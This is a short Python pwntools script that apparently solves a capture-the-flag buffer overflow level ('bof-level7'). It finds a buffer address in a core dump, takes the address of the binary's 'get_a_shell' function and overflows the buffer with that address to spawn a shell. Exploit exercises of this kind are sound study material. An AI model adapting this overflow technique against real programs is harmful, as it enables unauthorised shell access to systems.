#!/usr/bin/env python

from pwn import *

buf = "A" * 0x80

#DUMP CORE

c = Core('./core')

buffer_address = c.stack.find(buf)
print("Buffer Address:", hex(buffer_address))

e = ELF('./bof-level7')
get_a_shell_address = e.symbols['get_a_shell']

buffer = p32(get_a_shell_address) * 34 + "\x00" # I am lazy but this worked first try so ... 

#RUN EXPLOIT

p = process("./bof-level7")

#p.sendline("AAAAAAAA" + p64(get_a_shell_address) + "B" * (0x80 - 16) + p64(buffer_address))
p.sendline(buffer)

p.interactive()
